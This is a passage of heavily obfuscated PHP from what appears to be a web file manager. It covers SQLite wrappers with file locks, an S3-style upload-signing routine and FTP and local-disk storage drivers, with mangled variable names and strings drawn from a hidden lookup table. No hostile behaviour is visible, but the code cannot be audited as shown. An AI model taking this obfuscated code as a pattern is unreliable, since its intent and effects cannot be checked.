$¬ßóå™ =& $_SERVER[ÏÒ Ì„]; switch ($this->dbType) { case $¬ßóå™[940]: case $¬ßóå™[932]: case $¬ßóå™[913]: case $¬ßóå™[931]: case $¬ßóå™[915]: case $¬ßóå™[943]: return $this->_linkID->lastInsertId(); case $¬ßóå™[914]: case $¬ßóå™[916]: $Ç³¥¹ò‚ = $this->table; $üë…Üá = $this->query("\x53\x45\114\x45\103\x54\x20{$Ç³¥¹ò‚}\x2e\143\165\x72\x72\166\141\x6c\40\x63\x75\162\162\x76\141\x6c\x20\x46\x52\x4f\115\x20\x64\x75\141\154"); return $üë…Üá ? $üë…Üá[0][$¬ßóå™[955]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ç©ì®ê) { $éÔ¾Ö˜ı =& $_SERVER[ÏÒ Ì„]; if (!CacheLock::fileLock($éÔ¾Ö˜ı[9])) { return !1; } $ÇÁÆÚö— = parent::query($ç©ì®ê); CacheLock::fileUnLock($éÔ¾Ö˜ı[9]); return $ÇÁÆÚö—; } public function execute($âéÖ§”Ë) { $«¥ÃÅÕ§ =& $_SERVER[ÏÒ Ì„]; if (!CacheLock::fileLock($«¥ÃÅÕ§[9])) { return !1; } $ƒñİáÓ½ = parent::execute($âéÖ§”Ë); CacheLock::fileUnLock($«¥ÃÅÕ§[9]); return $ƒñİáÓ½; } } class DbSqlite3 extends DbSqlite3Base { public function query($ã«·Òù) { $Ì¿ı¬ô„ =& $_SERVER[ÏÒ Ì„]; if (!CacheLock::fileLock($Ì¿ı¬ô„[9])) { return !1; } $·ñšå÷ = parent::query($ã«·Òù); CacheLock::fileUnLock($Ì¿ı¬ô„[9]); return $·ñšå÷; } public function execute($ÈúòïÒŞ) { $”µáŞ‡’ =& $_SERVER[ÏÒ Ì„]; if (!CacheLock::fileLock($”µáŞ‡’[9])) { return !1; } $ö¢ÇŒÌÑ = parent::execute($ÈúòïÒŞ); CacheLock::fileUnLock($”µáŞ‡’[9]); return $ö¢ÇŒÌÑ; } } goto bæ·ƒâÎ; bø•Ï¤†¡ : class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ì©­ÕŒˆ) { parent::__construct($Ì©­ÕŒˆ); $this->signatureVersion($_SERVER[ÏÒ Ì„][212]); } public function uploadFormData($Ö½¢ŒêÆ, $‘‚ƒıÀî = 3600) { $ù€¾¡€Ä =& $_SERVER[ÏÒ Ì„]; $ŸÃÒõË¬ = $ù€¾¡€Ä[192]; $åÓ×‰ì„ = $ù€¾¡€Ä[1272]; $«Òò­· = $ù€¾¡€Ä[59]; $®×œ›ùÌ = gmdate($ù€¾¡€Ä[1273]); $ó‘‘ñ¦ = gmdate($ù€¾¡€Ä[741]); $¥æç•î = $ù€¾¡€Ä[1274]; $ï¶á›ÌÅ = $‘‚ƒıÀî . $ù€¾¡€Ä[33]; $âí±¶â = $ù€¾¡€Ä[1234]; $Š§õ¾ˆ‡ = array($this->accessKey, $ó‘‘ñ¦, $this->region, $«Òò­·, $¥æç•î); $ÖòâüÙŠ = implode($ù€¾¡€Ä[8], $Š§õ¾ˆ‡); $³ ±´™Ğ = array($ù€¾¡€Ä[1236] => gmdate($ù€¾¡€Ä[1235], strtotime($ù€¾¡€Ä[1275])), $ù€¾¡€Ä[1237] => array(array($ù€¾¡€Ä[1239] => $this->bucket), array($ù€¾¡€Ä[1238] => $ŸÃÒõË¬), array($ù€¾¡€Ä[1240], $ù€¾¡€Ä[1241], $ù€¾¡€Ä[33]), array($ù€¾¡€Ä[1240], $ù€¾¡€Ä[1276], $ù€¾¡€Ä[33]), array($ù€¾¡€Ä[1240], $ù€¾¡€Ä[1277], $ù€¾¡€Ä[33]), array($ù€¾¡€Ä[1242] => $âí±¶â), array($ù€¾¡€Ä[1278] => $ÖòâüÙŠ), array($ù€¾¡€Ä[1279] => $åÓ×‰ì„), array($ù€¾¡€Ä[1280] => $®×œ›ùÌ), array($ù€¾¡€Ä[1281] => $ï¶á›ÌÅ))); $ˆ‹‰Èú¨ = base64_encode(json_encode($³ ±´™Ğ)); $ı­¶êà = hash_hmac($ù€¾¡€Ä[1282], $ó‘‘ñ¦, $ù€¾¡€Ä[1283] . $this->secret, !0); $¡ƒÙÖë = hash_hmac($ù€¾¡€Ä[1282], $this->region, $ı­¶êà, !0); $õì€´âŞ = hash_hmac($ù€¾¡€Ä[1282], $«Òò­·, $¡ƒÙÖë, !0); $ë¨´‘êê = hash_hmac($ù€¾¡€Ä[1282], $¥æç•î, $õì€´âŞ, !0); $©¾¨©€² = hash_hmac($ù€¾¡€Ä[1282], $ˆ‹‰Èú¨, $ë¨´‘êê); $øå‹õ®¿ = array($ù€¾¡€Ä[211] => $ù€¾¡€Ä[33], $ù€¾¡€Ä[1284] => $ù€¾¡€Ä[33], $ù€¾¡€Ä[1238] => $ŸÃÒõË¬, $ù€¾¡€Ä[1242] => $âí±¶â, $ù€¾¡€Ä[1246] => $ˆ‹‰Èú¨, $ù€¾¡€Ä[1285] => $ÖòâüÙŠ, $ù€¾¡€Ä[1286] => $åÓ×‰ì„, $ù€¾¡€Ä[1287] => $®×œ›ùÌ, $ù€¾¡€Ä[1288] => $ï¶á›ÌÅ, $ù€¾¡€Ä[1289] => $©¾¨©€², $ù€¾¡€Ä[175] => $this->getHost()); return $øå‹õ®¿; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Îõ¥ƒ‘) { parent::__construct(); if (count($Îõ¥ƒ‘) > 0) { $this->_init($Îõ¥ƒ‘); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($è·ê“—Í) { $­•É‘Â… =& $_SERVER[ÏÒ Ì„]; global $config; $this->appCharset = $config[$­•É‘Â…[1290]]; $this->systemCharset = $config[$­•É‘Â…[1291]]; if (isset($è·ê“—Í[$­•É‘Â…[1292]]) && $è·ê“—Í[$­•É‘Â…[1292]]) { $this->systemCharset = $è·ê“—Í[$­•É‘Â…[1292]]; } } public function iconvApp($Ë×ùˆÍ±) { return $this->iconvTo($Ë×ùˆÍ±, $this->systemCharset, $this->appCharset); } public function iconvSystem($­ÉÍ ‹®) { return $this->iconvTo($­ÉÍ ‹®, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÕÕŸÙ†) { $€ÏÌ°ûÄ =& $_SERVER[ÏÒ Ì„]; $´¤ë¸³ = $this->iconvApp($this->pathBase); $ÕÕŸÙ† = $this->iconvApp($ÕÕŸÙ†); if (substr($´¤ë¸³, 0, 2) == $€ÏÌ°ûÄ[1293]) { $´¤ë¸³ = BASIC_PATH . substr($´¤ë¸³, 2); } if (substr($ÕÕŸÙ†, 0, 2) == $€ÏÌ°ûÄ[1293]) { $ÕÕŸÙ† = BASIC_PATH . substr($ÕÕŸÙ†, 2); } $´¤ë¸³ = KodIO::clear($´¤ë¸³); $ÕÕŸÙ† = KodIO::clear($ÕÕŸÙ†); $ÕÕŸÙ† = substr($ÕÕŸÙ†, strlen($´¤ë¸³)); if (empty($this->pathDriver)) { return $ÕÕŸÙ†; } return $this->pathDriver . $€ÏÌ°ûÄ[8] . ltrim($ÕÕŸÙ†, $€ÏÌ°ûÄ[8]); } private function _init($¸Óüòı = array()) { $ŸçåÍË¡ =& $_SERVER[ÏÒ Ì„]; if (!function_exists($ŸçåÍË¡[1294])) { throw new Exception(LNG($ŸçåÍË¡[1295])); } $this->config = $¸Óüòı; $this->charsetReset($¸Óüòı); foreach ($¸Óüòı as $Ü’ŠÏ€‚ => $ˆ»³¯Şç) { if (isset($this->{$Ü’ŠÏ€‚})) { $this->{$Ü’ŠÏ€‚} = $ˆ»³¯Şç; } } return $this->_login($¸Óüòı); } private function _login($ß£‡şœß) { $‰±–ğı® =& $_SERVER[ÏÒ Ì„]; static $¬âÙó È = array(); $Ë¶ì¹µ… = md5(json_encode($ß£‡şœß)); if (isset($¬âÙó È[$Ë¶ì¹µ…])) { foreach ($¬âÙó È[$Ë¶ì¹µ…] as $¥æğ³âÕ => $£åî³Ùï) { $this->{$¥æğ³âÕ} = $£åî³Ùï; } return !0; } $Ò¼ãò´ = parse_url(trim($this->server, $‰±–ğı®[8])); $this->host = $Ò¼ãò´[$‰±–ğı®[175]]; $¥Ğ‡…³Ö = isset($Ò¼ãò´[$‰±–ğı®[174]]) && $Ò¼ãò´[$‰±–ğı®[174]] == $‰±–ğı®[1296] ? !0 : !1; $this->scheme = $¥Ğ‡…³Ö ? $‰±–ğı®[1297] : $‰±–ğı®[1298]; $this->port = isset($Ò¼ãò´[$‰±–ğı®[176]]) ? $Ò¼ãò´[$‰±–ğı®[176]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $õ†®ÊØ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ª·óææ = $this->pasv == $‰±–ğı®[87] ? !0 : !1; @ftp_pasv($this->connect, $ª·óææ); $¬âÙó È[$Ë¶ì¹µ…] = array($‰±–ğı®[1299] => $this->connect, $‰±–ğı®[175] => $this->host, $‰±–ğı®[174] => $this->scheme, $‰±–ğı®[176] => $this->port); return $õ†®ÊØ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($‰Èúº, $‰Ãû¤µÚ = '', $Ë°ÈÀúó = REPEAT_RENAME) { if ($this->setContent($‰Èúº, $‰Ãû¤µÚ)) { return $this->getPathOuter($‰Èúº); } return !1; } public function mkdir($à‡ÆŸª, $õ¯Ñ¹ŠŞ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $à‡ÆŸª = $this->iconvSystem($à‡ÆŸª); if ($this->_isFolder($à‡ÆŸª) || @ftp_mkdir($this->connect, $à‡ÆŸª)) { return $this->getPathOuter($à‡ÆŸª); } if (!$this->mkdir($this->pathFather($à‡ÆŸª))) { return !1; } if ($à‡ÆŸª = @ftp_mkdir($this->connect, $à‡ÆŸª)) { return $this->getPathOuter($à‡ÆŸª); } return !1; } public function copyFile($¬é€áæ, $³µìß¿) { if (!$this->_isconn()) { return !1; } $ï©¸ãÖ° = $this->pathThis($this->iconvSystem($¬é€áæ)); $·ŸÍÄšİ = $this->tempFile($ï©¸ãÖ°); $¤öáƒµ = $this->iconvApp($·ŸÍÄšİ); $this->download($¬é€áæ, $¤öáƒµ); $¿”¤´©© = $this->upload($³µìß¿, $¤öáƒµ); $this->tempFileRemve($·ŸÍÄšİ); return $¿”¤´©©; } public function moveFile($¾ÈÅ¸›ß, $¡Ÿ¨ôş») { if (!$this->_isconn()) { return !1; } $¾ÈÅ¸›ß = $this->iconvSystem($¾ÈÅ¸›ß); $¡Ÿ¨ôş» = $this->iconvSystem($¡Ÿ¨ôş»); $¤íáùÜñ = @ftp_rename($this->connect, $¾ÈÅ¸›ß, $¡Ÿ¨ôş»); return $¤íáùÜñ ? $this->getPathOuter($¡Ÿ¨ôş») : !1; } public function delFile($á‹Áõ’¨) { if (!$this->_isconn()) { return !1; } $á‹Áõ’¨ = $this->iconvSystem($á‹Áõ’¨); return @ftp_delete($this->connect, $á‹Áõ’¨); } public function delFolder($í§¸”¨‚) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $šÃ±Ş¿ = $Ğ›øûö— = array(); $this->fileList($í§¸”¨‚, $šÃ±Ş¿, $Ğ›øûö—, !0); $this->listItemCache = !0; foreach ($Ğ›øûö— as $ûÚ€âÌ) { $óÖ²Š‚œ = $this->iconvSystem($ûÚ€âÌ[$_SERVER[ÏÒ Ì„][28]]); $®”ôª¥ = @ftp_delete($this->connect, $óÖ²Š‚œ); if (!$®”ôª¥) { return !1; } } foreach ($šÃ±Ş¿ as $óÖ²Š‚œ) { $óÖ²Š‚œ = $this->iconvSystem($óÖ²Š‚œ); $®”ôª¥ = @ftp_rmdir($this->connect, $óÖ²Š‚œ); if (!$®”ôª¥) { return !1; } } $í§¸”¨‚ = $this->iconvSystem($í§¸”¨‚); return @ftp_rmdir($this->connect, $í§¸”¨‚); } public function rename($ï®Ìùˆ, $ÔÚ‘‡³¼) { $§¥Ã¤é€ =& $_SERVER[ÏÒ Ì„]; if (!$this->_isconn()) { return !1; } $ĞÉ ñ˜“ = $this->fileNameAuto($this->pathFather($ï®Ìùˆ), $ÔÚ‘‡³¼); $ĞÉ ñ˜“ = $this->iconvSystem($ĞÉ ñ˜“); $ï®Ìùˆ = $this->iconvSystem($ï®Ìùˆ); $ôšªŒõ† = $this->pathFather($ï®Ìùˆ); $ƒßÑ‰ = rtrim($ôšªŒõ†, $§¥Ã¤é€[8]) . $§¥Ã¤é€[8] . $ĞÉ ñ˜“; $ü¤ç‰‰— = @ftp_rename($this->connect, $ï®Ìùˆ, $ƒßÑ‰); $ƒßÑ‰ = $this->iconvApp($ƒßÑ‰); return $ü¤ç‰‰— ? $this->getPathOuter($ƒßÑ‰) : !1; } private function folderInfo($ÊÒ¢Â¢Ï, $‡øŠ“˜ = false) { $®Üó»æ« =& $_SERVER[ÏÒ Ì„]; $Ã´‚ºˆµ = array($®Üó»æ«[28] => $this->pathThis($ÊÒ¢Â¢Ï), $®Üó»æ«[76] => $this->getPathOuter($®Üó»æ«[8] . $ÊÒ¢Â¢Ï), $®Üó»æ«[29] => $®Üó»æ«[77]); if ($‡øŠ“˜) { return $Ã´‚ºˆµ; } $Ã´‚ºˆµ[$®Üó»æ«[194]] = $Ã´‚ºˆµ[$®Üó»æ«[84]] = 0; $Ã´‚ºˆµ[$®Üó»æ«[195]] = $Ã´‚ºˆµ[$®Üó»æ«[196]] = !0; return $Ã´‚ºˆµ; } private function fileInfo($âÕØá‰ª, $ùşŸ°­½ = false, $Ö©ÔÈ™’ = array()) { $†óâˆÈÃ =& $_SERVER[ÏÒ Ì„]; $ÄÛô®ÑÉ = array($†óâˆÈÃ[28] => $this->pathThis($âÕØá‰ª), $†óâˆÈÃ[76] => $this->getPathOuter($†óâˆÈÃ[8] . $âÕØá‰ª), $†óâˆÈÃ[29] => $†óâˆÈÃ[193], $†óâˆÈÃ[78] => isset($Ö©ÔÈ™’[$†óâˆÈÃ[78]]) ? $Ö©ÔÈ™’[$†óâˆÈÃ[78]] : 0, $†óâˆÈÃ[168] => $this->ext($âÕØá‰ª)); if ($ùşŸ°­½) { return $ÄÛô®ÑÉ; } $ÄÛô®ÑÉ[$†óâˆÈÃ[194]] = $ÄÛô®ÑÉ[$†óâˆÈÃ[84]] = 0; $ÄÛô®ÑÉ[$†óâˆÈÃ[195]] = $ÄÛô®ÑÉ[$†óâˆÈÃ[196]] = !0; $˜¡ò¾É” = $this->iconvSystem($âÕØá‰ª); $ÄÛô®ÑÉ[$†óâˆÈÃ[84]] = @ftp_mdtm($this->connect, $˜¡ò¾É”); if (empty($Ö©ÔÈ™’)) { $Ö©ÔÈ™’ = $this->objectMeta($âÕØá‰ª); if (!$Ö©ÔÈ™’) { return $ÄÛô®ÑÉ; } } $ÄÛô®ÑÉ[$†óâˆÈÃ[78]] = $Ö©ÔÈ™’[$†óâˆÈÃ[78]]; return $ÄÛô®ÑÉ; } public function size($Œ·ô‚ÀÖ) { $–Ä´†şä = $this->objectMeta($Œ·ô‚ÀÖ); return $–Ä´†şä ? $–Ä´†şä[$_SERVER[ÏÒ Ì„][78]] : 0; } public function info($ûÂ™ü¡®) { if ($this->isFile($ûÂ™ü¡®)) { return $this->fileInfo($ûÂ™ü¡®, 0); } else { if ($this->isFolder($ûÂ™ü¡®)) { return $this->folderInfo($ûÂ™ü¡®); } } return !1; } private function fileList($ÏÑ×ñ±», &$²ºğŞÌ·, &$ù“äÓ‰Ù, $Ê…õèÑ€ = false) { $ïÈåæÀ =& $_SERVER[ÏÒ Ì„]; $ÏÑ×ñ±» = $this->iconvSystem($ÏÑ×ñ±»); if (!$this->isFolder($ÏÑ×ñ±»)) { return !1; } @ftp_chdir($this->connect, $ïÈåæÀ[8]); $ÏÑ×ñ±» = rtrim($ÏÑ×ñ±», $ïÈåæÀ[8]) . $ïÈåæÀ[8]; check_abort(); $´©ØøÌ‚ = $this->listItemCache === !1 ? !1 : !0; $şµí’˜ = @ftp_rawlist($this->connect, $ÏÑ×ñ±»); if (!$şµí’˜) { $şµí’˜ = array(); } $à›éÌ·‘ = array($ïÈåæÀ[95] => 1, $ïÈåæÀ[1300] => 1); foreach ($şµí’˜ as $½ÃîÚâ) { $‹©Š¨Äœ = $this->_listItem($½ÃîÚâ); if ($‹©Š¨Äœ[0] == $ïÈåæÀ[749]) { continue; } $ Œ¼‡Ö = $‹©Š¨Äœ[8]; if (empty($ Œ¼‡Ö) && $ Œ¼‡Ö !== $ïÈåæÀ[191] || isset($à›éÌ·‘[$ Œ¼‡Ö])) { continue; } $ Œ¼‡Ö = $this->iconvApp($ÏÑ×ñ±» . ltrim($ Œ¼‡Ö, $ïÈåæÀ[8])); $“ñ³¨á€ = array($ïÈåæÀ[28] => $ Œ¼‡Ö, $ïÈåæÀ[29] => $ïÈåæÀ[193], $ïÈåæÀ[78] => $‹©Š¨Äœ[4]); if (substr($½ÃîÚâ, 0, 1) == $ïÈåæÀ[1301]) { $“ñ³¨á€[$ïÈåæÀ[29]] = $ïÈåæÀ[77]; $“ñ³¨á€[$ïÈåæÀ[78]] = 0; } $äÌ–©£ = $“ñ³¨á€[$ïÈåæÀ[29]] == $ïÈåæÀ[77] ? !0 : !1; if ($´©ØøÌ‚) { $this->cacheMethod($ïÈåæÀ[199], $ Œ¼‡Ö, $äÌ–©£); $this->cacheMethod($ïÈåæÀ[200], $ Œ¼‡Ö, $“ñ³¨á€); } if ($äÌ–©£) { $²ºğŞÌ·[] = $ Œ¼‡Ö; if ($Ê…õèÑ€) { $this->fileList($ Œ¼‡Ö, $²ºğŞÌ·, $ù“äÓ‰Ù, $Ê…õèÑ€); } continue; } $ù“äÓ‰Ù[] = $“ñ³¨á€; } if ($´©ØøÌ‚) { $this->cacheMethod($ïÈåæÀ[199], $ÏÑ×ñ±», !0); } } private function _listItem($²˜©®³˜) { if (empty($²˜©®³˜)) { return array(); } $ÒÀÒ€•Å = preg_split($_SERVER[ÏÒ Ì„][1302], $²˜©®³˜); if (count($ÒÀÒ€•Å) <= 9) { return $ÒÀÒ€•Å; } $ÒÀÒ€•Å[8] = trim(substr($²˜©®³˜, strpos($²˜©®³˜, $ÒÀÒ€•Å[7]) + strlen($ÒÀÒ€•Å[7]))); return array_splice($ÒÀÒ€•Å, 0, 9); } public function listPath($ú¢é‘òÔ, $üĞÉëÀÏ = false) { $äÖµµÖ« =& $_SERVER[ÏÒ Ì„]; if (!$this->_isconn()) { return !1; } $ÔÜğ‘±ş = $âê·‘ = array(); $this->fileList($ú¢é‘òÔ, $ÔÜğ‘±ş, $âê·‘); foreach ($ÔÜğ‘±ş as $á×ÌÃŒƒ => $¯ ÇÓî) { $ÔÜğ‘±ş[$á×ÌÃŒƒ] = $this->folderInfo($¯ ÇÓî, $üĞÉëÀÏ); } foreach ($âê·‘ as $á×ÌÃŒƒ => $¯ ÇÓî) { $âê·‘[$á×ÌÃŒƒ] = $this->fileInfo($¯ ÇÓî[$äÖµµÖ«[28]], $üĞÉëÀÏ, $¯ ÇÓî); } return array($äÖµµÖ«[75] => $ÔÜğ‘±ş, $äÖµµÖ«[74] => $âê·‘); } public function has($ÄÛ÷Š¢’, $¦”ç¯ï¯ = false, $”“Éƒ Ê = true) { $³Šãµ×¯ =& $_SERVER[ÏÒ Ì„]; $ Ö³êı = $¿İÅó¦ = array(); $Óñ‚†î£ = $¦”ç¯ï¯ ? !0 : !1; $this->fileList($ÄÛ÷Š¢’, $ Ö³êı, $¿İÅó¦, $Óñ‚†î£); if ($¦”ç¯ï¯) { return array($³Šãµ×¯[203] => count($¿İÅó¦), $³Šãµ×¯[204] => count($ Ö³êı)); } if ($”“Éƒ Ê) { if (count($¿İÅó¦)) { return !0; } } else { if (count($ Ö³êı)) { return !0; } } return !1; } public function listAll($½ğ˜‹¼Á) { $¶«œÊÜø =& $_SERVER[ÏÒ Ì„]; if (!$this->_isconn()) { return !1; } $Ê·œâÕ = $İ áÎîƒ = array(); $this->fileList($½ğ˜‹¼Á, $Ê·œâÕ, $İ áÎîƒ, !0); $«ÈóÒ²÷ = array(); foreach ($İ áÎîƒ as $¯òÅàƒ€) { $«ÈóÒ²÷[$¯òÅàƒ€[$¶«œÊÜø[28]]] = $¯òÅàƒ€[$¶«œÊÜø[78]]; } foreach ($Ê·œâÕ as $¯òÅàƒ€) { if (is_string($¯òÅàƒ€)) { $«ÈóÒ²÷[$¯òÅàƒ€] = 0; } } return $this->listAllFiles($½ğ˜‹¼Á, array_keys($«ÈóÒ²÷), $«ÈóÒ²÷); } public function getContent($ÕšîÜéù) { if (!$this->_isconn()) { return !1; } $ÕšîÜéù = $this->iconvSystem($ÕšîÜéù); return $this->fileSubstr($ÕšîÜéù); } public function setContent($¡ÇŒé²×, $ŒÆ ıŒ = '') { if (!$this->_isconn()) { return !1; } $§•œ£Î• = $this->pathThis($this->iconvSystem($¡ÇŒé²×)); $õƒğ¸ğÖ = $this->tempFile($§•œ£Î•); file_put_contents($õƒğ¸ğÖ, $ŒÆ ıŒ); $ı–’ÙÈº = $this->upload($¡ÇŒé²×, $this->iconvApp($õƒğ¸ğÖ)); $this->tempFileRemve($õƒğ¸ğÖ); return $ı–’ÙÈº; } public function fileSubstr($Õâş…®¨, $Ùµôìã = 0, $öèîÁÂ¢ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Õâş…®¨, $Ùµôìã, $öèîÁÂ¢); } private function ftpRequest($çƒ¿Ëµ, $”Œ¾ùÂË = 0, $Ş›Ã˜•¦ = false) { $çƒ¿Ëµ = $this->iconvSystem($çƒ¿Ëµ); $¢ˆÓáĞÕ = $this->scheme . $this->host . $_SERVER[ÏÒ Ì„][4] . $this->port; $ÎŒ¿ßôã = curl_init(); curl_setopt($ÎŒ¿ßôã, CURLOPT_URL, $¢ˆÓáĞÕ . $this->pathEncode($çƒ¿Ëµ)); curl_setopt($ÎŒ¿ßôã, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Ş›Ã˜•¦) { $íÖÖ°ó = $”Œ¾ùÂË + $Ş›Ã˜•¦ - 1; curl_setopt($ÎŒ¿ßôã, CURLOPT_RANGE, "{$”Œ¾ùÂË}\55{$íÖÖ°ó}"); } curl_setopt($ÎŒ¿ßôã, CURLOPT_RETURNTRANSFER, 1); $µÅÁ¿¬ = curl_exec($ÎŒ¿ßôã); curl_close($ÎŒ¿ßôã); return $µÅÁ¿¬; } public function upload($¤±¨°í§, $´î°, $õÅ›¹¾ = false, $¾®®™ÛÜ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¤±¨°í§))) { return !1; } $¤±¨°í§ = $this->iconvSystem($¤±¨°í§); $´î° = $this->iconvSystem($´î°); $ß‰úÉÈÍ = ftp_nb_put($this->connect, $¤±¨°í§, $´î°, FTP_BINARY); while ($ß‰úÉÈÍ == FTP_MOREDATA) { $ß‰úÉÈÍ = ftp_nb_continue($this->connect); } if ($ß‰úÉÈÍ != FTP_FINISHED) { return !1; } return $this->getPathOuter($¤±¨°í§); } public function download($³óòº•, $Ë‘¨ü‹ú = '') { if (!$this->_isconn()) { return !1; } $Ü¦®†æ­ = $this->pathFather($Ë‘¨ü‹ú); if (!IO::mkdir($Ü¦®†æ­)) { return !1; } $³óòº• = $this->iconvSystem($³óòº•); $Ë‘¨ü‹ú = $this->iconvSystem($Ë‘¨ü‹ú); $ªêğÊ…ƒ = ftp_nb_get($this->connect, $Ë‘¨ü‹ú, $³óòº•, FTP_BINARY); while ($ªêğÊ…ƒ == FTP_MOREDATA) { $ªêğÊ…ƒ = ftp_nb_continue($this->connect); } if ($ªêğÊ…ƒ != FTP_FINISHED) { return !1; } return $this->iconvApp($Ë‘¨ü‹ú); } public function exist($„›Ç•€³) { return $this->isFile($„›Ç•€³) || $this->isFolder($„›Ç•€³); } public function isFile($ı«Ş›»Ã) { return !$this->isFolder($ı«Ş›»Ã) && $this->objectMeta($ı«Ş›»Ã); } public function isFolder($¯±©Ê¢¶) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][199], $¯±©Ê¢¶); } protected function objectMeta($Õ€£‹˜Ä) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][200], $Õ€£‹˜Ä); } protected function _objectMeta($†ë¡–±Ï) { $óæñ€Œß =& $_SERVER[ÏÒ Ì„]; if ($†ë¡–±Ï == $óæñ€Œß[33] || $†ë¡–±Ï == $óæñ€Œß[8]) { return array(); } if (!$this->_isconn()) { return !1; } $†ë¡–±Ï = $this->iconvSystem($†ë¡–±Ï); $îÓ‹À…Õ = array($óæñ€Œß[28] => $this->iconvApp($†ë¡–±Ï), $óæñ€Œß[29] => $óæñ€Œß[193], $óæñ€Œß[78] => 0); @ftp_chdir($this->connect, $óæñ€Œß[8]); $ŒÛ‰úİÌ = @ftp_size($this->connect, $†ë¡–±Ï); if ($ŒÛ‰úİÌ != -1) { $îÓ‹À…Õ[$óæñ€Œß[78]] = $ŒÛ‰úİÌ; } else { $ÄÂ¯œğ£ = @ftp_chdir($this->connect, $†ë¡–±Ï); if (!$ÄÂ¯œğ£) { return !1; } $îÓ‹À…Õ[$óæñ€Œß[29]] = $óæñ€Œß[77]; } return $îÓ‹À…Õ; } protected function _isFolder($„¥¡å¦ó) { $¡€İí¿¤ =& $_SERVER[ÏÒ Ì„]; if ($„¥¡å¦ó == $¡€İí¿¤[33] || $„¥¡å¦ó == $¡€İí¿¤[8]) { return !0; } $š¦óÆç = $this->_objectMeta($„¥¡å¦ó); return isset($š¦óÆç[$¡€İí¿¤[29]]) && $š¦óÆç[$¡€İí¿¤[29]] == $¡€İí¿¤[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($èíÖÎ¥Í) { if (substr($èíÖÎ¥Í, 0, 2) == $_SERVER[ÏÒ Ì„][1293]) { $èíÖÎ¥Í = BASIC_PATH . substr($èíÖÎ¥Í, 2); } return $èíÖÎ¥Í; } public function iconvApp($»Â©ñıÙ) { $š­²¥ªÓ =& $_SERVER[ÏÒ Ì„]; global $config; return $this->iconvTo($»Â©ñıÙ, $config[$š­²¥ªÓ[1291]], $config[$š­²¥ªÓ[1290]]); } public function iconvSystem($Š³¹£) { $¶™Ë¯­† =& $_SERVER[ÏÒ Ì„]; global $config; return $this->iconvTo($Š³¹£, $config[$¶™Ë¯­†[1290]], $config[$¶™Ë¯­†[1291]]); } public function getPathOuter($—È‘šğÔ) { $©Ü¸®¤ =& $_SERVER[ÏÒ Ì„]; $ı€×ãÑ¼ = $this->iconvApp($this->pathBase); $—È‘šğÔ = $this->iconvApp($—È‘šğÔ); if (substr($ı€×ãÑ¼, 0, 2) == $©Ü¸®¤[1293]) { $ı€×ãÑ¼ = BASIC_PATH . substr($ı€×ãÑ¼, 2); } if (substr($—È‘šğÔ, 0, 2) == $©Ü¸®¤[1293]) { $—È‘šğÔ = BASIC_PATH . substr($—È‘šğÔ, 2); } $ı€×ãÑ¼ = KodIO::clear($ı€×ãÑ¼); $—È‘šğÔ = KodIO::clear($—È‘šğÔ); $—È‘šğÔ = substr($—È‘šğÔ, strlen($ı€×ãÑ¼)); if (empty($this->pathDriver)) { return $—È‘šğÔ; } return $this->pathDriver . $©Ü¸®¤[8] . ltrim($—È‘šğÔ, $©Ü¸®¤[8]); } public function mkfile($ªÅ¿¤·•, $º¢¯ˆ = '', $ë·ÏÚÈÃ = REPEAT_RENAME) { $ªÅ¿¤·• = $this->iconvSystem($ªÅ¿¤·•); @touch($ªÅ¿¤·•); if ($º¢¯ˆ) { file_put_contents($ªÅ¿¤·•, $º¢¯ˆ); } @chmod($ªÅ¿¤·•, $this->pathAuth); return is_file($ªÅ¿¤·•) ? $this->getPathOuter($ªÅ¿¤·•) : !1; } public function mkdir($‚µÑÈ˜, $ç‹˜şü = REPEAT_SKIP) { $‚µÑÈ˜ = $this->iconvSystem($‚µÑÈ˜); if (is_dir($‚µÑÈ˜)) { return $this->getPathOuter($‚µÑÈ˜); } @mkdir($‚µÑÈ˜, $this->pathAuth, !0); @chmod($‚µÑÈ˜, $this->pathAuth); return is_dir($‚µÑÈ˜) ? $this->getPathOuter($‚µÑÈ˜) : !1; } public function copyFile($¦®®Üæ—, $ÃíçØõù) { $this->mkdir($this->pathFather($ÃíçØõù)); $¦®®Üæ— = $this->iconvSystem($¦®®Üæ—); $ÃíçØõù = $this->iconvSystem($ÃíçØõù); $î²‡é£ = copy_64($¦®®Üæ—, $ÃíçØõù); @chmod($ÃíçØõù, $this->pathAuth); return $î²‡é£ ? $this->getPathOuter($ÃíçØõù) : !1; } public function moveFile($ıš¤ûà‰, $ó¿ñæÀÁ) { $this->mkdir($this->pathFather($ó¿ñæÀÁ)); $ıš¤ûà‰ = $this->iconvSystem($ıš¤ûà‰); $ó¿ñæÀÁ = $this->iconvSystem($ó¿ñæÀÁ); $†ç—ªÇÑ = intval(@rename($ıš¤ûà‰, $ó¿ñæÀÁ)); if (!$†ç—ªÇÑ) { if ($†ç—ªÇÑ = intval(@copy_64($ıš¤ûà‰, $ó¿ñæÀÁ))) { @unlink($ıš¤ûà‰); } } @chmod($ó¿ñæÀÁ, $this->pathAuth); return $†ç—ªÇÑ ? $this->getPathOuter($ó¿ñæÀÁ) : !1; } public function movePath($ Ë¸ªğÇ, $éà™¾»í, $ğŸ½ éÌ = false) { $îš«±õ® =& $_SERVER[ÏÒ Ì„]; $ 